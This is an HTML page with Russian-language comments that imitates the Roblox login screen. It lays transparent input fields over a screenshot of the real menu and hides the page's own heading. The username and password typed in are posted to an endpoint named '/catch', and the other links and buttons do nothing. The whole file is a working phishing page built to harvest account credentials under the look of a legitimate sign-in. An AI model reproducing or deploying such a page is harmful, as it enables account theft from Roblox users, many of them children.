<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            /* Твой фоновый рисунок с нарисованной менюшкой */
            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: flex-start; /* Выравниваем форму слева */
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .auth-container {
            background: transparent; /* Полностью прозрачный блок */
            width: 100%;
            max-width: 440px;
            padding: 30px;
            
            /* Смещение формы ровно на нарисованное меню на картинке */
            margin-left: 12%; 
            
            text-align: center;
            box-sizing: border-box;
        }

        /* Прячем заголовок HTML, так как он уже нарисован на фоновой картинке */
        h1 {
            opacity: 0; 
            margin-bottom: 25px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* Поля ввода сделаны прозрачными с тонкой рамкой, чтобы совпадать с картинкой */
        .input-control {
            width: 100%;
            padding: 12px;
            background-color: rgba(20, 20, 20, 0.6); 
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            color: #ffffff;
            font-size: 14px;
            box-sizing: border-box;
        }

        .input-control:focus {
            background-color: rgba(0, 0, 0, 0.8);
            border-color: #ffffff;
            outline: none;
        }

        .error-message {
            color: #f85149;
            font-size: 13px;
            display: none;
            text-align: left;
        }

        /* Прозрачные кнопки поверх картинки */
        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: rgba(255, 255, 255, 0.9);
            color: #000000;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }

        .btn-submit:hover {
            background-color: #ffffff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }

        .link-text {
            display: block;
            margin-top: 15px;
            color: #b8b8b8;
            font-size: 13px;
            text-decoration: none;
        }

        .link-text:hover {
            text-decoration: underline;
        }

        .secondary-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-secondary {
            width: 100%;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.3);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            cursor: pointer;
        }

        .btn-secondary:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .signup-text {
            margin-top: 25px;
            font-size: 14px;
            color: #b8b8b8;
        }

        .signup-text a {
            color: #ffffff;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <h1>Login to Roblox</h1>
        
        <form action="/catch" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

</body>
</html>
